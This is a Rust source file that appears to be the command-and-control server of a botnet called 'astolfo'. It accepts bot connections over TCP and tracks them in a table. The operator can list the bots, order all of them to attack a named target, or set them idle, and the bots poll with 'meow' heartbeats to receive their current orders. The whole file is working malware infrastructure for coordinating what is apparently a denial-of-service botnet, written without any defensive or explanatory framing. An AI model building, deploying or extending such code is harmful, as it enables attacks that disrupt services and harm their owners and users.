use std::{
    collections::HashMap, env, io::Write, net::SocketAddr, process, sync::{Arc, Mutex}, time::{Duration, SystemTime}
};

use astolfo::BotState;
use tokio::{
    io::{self, AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader},
    net::{TcpListener, TcpStream}, time::sleep,
};

#[derive(Debug)]
struct Femboy {
    state: BotState,
    timestamp: SystemTime
}

type BotTable = Arc<Mutex<HashMap<SocketAddr, Femboy>>>;

#[tokio::main]
async fn main() {
    let port = env::args().nth(1).unwrap_or_else(|| {
        println!("Usage: astolfo <PORT>");
        process::exit(1);
    });
    let port: u16 = port.parse().unwrap_or_else(|_err| {
        println!("[\x1b[91mERR\x1b[0m] Please provide valid port number");
        process::exit(1);
    });

    let femtable: BotTable = Arc::new(Mutex::new(HashMap::new()));

    let listen_femtable = Arc::clone(&femtable);

    tokio::spawn(async move {
        let listener = TcpListener::bind(format!("0.0.0.0:{port}"))
            .await
            .unwrap_or_else(|err| {
                println!("[\x1b[91mERR\x1b[0m] Failed to bind address ({err})");
                process::exit(1);
            });

        println!("[\x1b[94mINFO\x1b[0m] Listening for bots on 0.0.0.0:{port}");

        loop {
            let femboy = match listener.accept().await {
                Ok((stream, addr)) => (stream, addr),
                Err(err) => {
                    println!("[\x1b[91mERR\x1b[0m] Failed to established connection to bot ({err})");
                    continue;
                }
            };

            {
                let mut femtable = listen_femtable.lock().unwrap_or_else(|_| {
                    process::exit(1);
                });

                femtable.insert(
                    femboy.1,
                    Femboy { state: BotState::Idle, timestamp: SystemTime::now() }
                );

            }

            println!("[\x1b[94mINFO\x1b[0m] New Bot {}", femboy.1);
            let bot_table = Arc::clone(&listen_femtable);
            tokio::spawn(async move { handle_femboy(bot_table, femboy.1, femboy.0).await });
        }
    });

    let command_femtable = Arc::clone(&femtable);

    tokio::spawn(async move {
        sleep(Duration::from_secs(1)).await; // Give everything sometime to start
        let mut stdin = BufReader::new(io::stdin());
        let mut buf = String::new();
        loop {
            print!("> ");
            std::io::stdout().flush().ok();
            if let Err(_) = stdin.read_line(&mut buf).await {
                println!("[\x1b[91mERR\x1b[0m] Failed to read command");
                continue;
            }

            let mut command_string = buf.trim().split(' ');
            let command = command_string.next().unwrap_or_else(|| {
                ""
            });

            if command == "bots" {
                let femtable = femtable.lock().unwrap_or_else(|_| {
                    process::exit(1);
                });

                display_table(&*femtable);
            }
            else if command == "attack" {
                let target = command_string.next();
                if let Some(target) = target {
                    let mut table = command_femtable.lock().unwrap();
                    for (_,v) in table.iter_mut() {
                        v.state = BotState::Attacking(target.to_owned());
                    }

                    println!("[\x1b[92mSUCC\x1b[0m] Set bot(s) to attack mode, target {target}");
                }
                else {
                    println!("[\x1b[91mERR\x1b[0m] Invalid target");
                }
            }
            else if command == "stop" {
                let mut table = command_femtable.lock().unwrap();
                for (_,v) in table.iter_mut() {
                    v.state = BotState::Idle;
                }
                println!("[\x1b[92mSUCC\x1b[0m] Set bot(s) to idle mode");
            }
            else {
                if command != "" {
                    println!("[\x1b[91mERR\x1b[0m] Invalid command");
                }
            }

            buf.clear();
        }
    })
    .await.ok();
}

async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStream) {

    let config = bincode::config::standard();
    loop {
        let size = match stream.read_u16().await {
            Ok(size) => size,
            Err(_) => {
                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                table.remove(&addr);
                println!("[\x1b[94mINFO\x1b[0m] Bot dissconnected ({addr})");
                return
            }
        };

        let mut buf = vec![0u8; size as usize];
        if let Err(_) = stream.read_exact(buf.as_mut_slice()).await {
            let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
            table.remove(&addr);
            println!("[\x1b[94mINFO\x1b[0m] Bot dissconnected ({addr})");
            return
        }

        let msg = match String::from_utf8(buf) {
            Ok(msg) => msg,
            Err(_) => {
                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                table.remove(&addr);
                println!("[\x1b[94mINFO\x1b[0m] Bot sent invalid message, disconnecting ({addr})");
                return
            }
        };

        if msg == "meow" {
            let state = {
                let mut table = femtable.lock().unwrap_or_else(|_| {
                    panic!("uh oh");
                });

                table.entry(addr).and_modify(|bot| bot.timestamp = SystemTime::now());
                table[&addr].state.clone()
            };

            let payload = match bincode::encode_to_vec(state, config) {
                Ok(payload) => payload,
                Err(_) => {
                    let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                    table.remove(&addr);
                    println!("[\x1b[94mINFO\x1b[0m] Server error, failed to encode state, disconnecting bot ({addr})");
                    return
                }
            };

            if let Err(_) = stream.write_u16(payload.len() as u16).await {
                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                table.remove(&addr);
                println!("[\x1b[94mINFO\x1b[0m] Bot disconnected ({addr})");
                return
            }

            if let Err(_) = stream.write_all(payload.as_slice()).await {
                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                table.remove(&addr);
                println!("[\x1b[94mINFO\x1b[0m] Bot disconnected ({addr})");
                return

            }
        }
        else {
            let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
            table.remove(&addr);
            println!("[\x1b[94mINFO\x1b[0m] Bot sent wrong message, disconnecting ({addr})");
            return
        }

    }
}

fn display_table(femtable: &HashMap<SocketAddr, Femboy>) {
    for (k,v) in femtable.iter() {
        match v.state {
            BotState::Idle => println!("\x1b[92m●\x1b[0m {k} Idle"),
            BotState::Attacking(ref addr) => println!("\x1b[91m●\x1b[0m {k} Attacking -> {addr}"),
            _ => {}
        }
    }
}
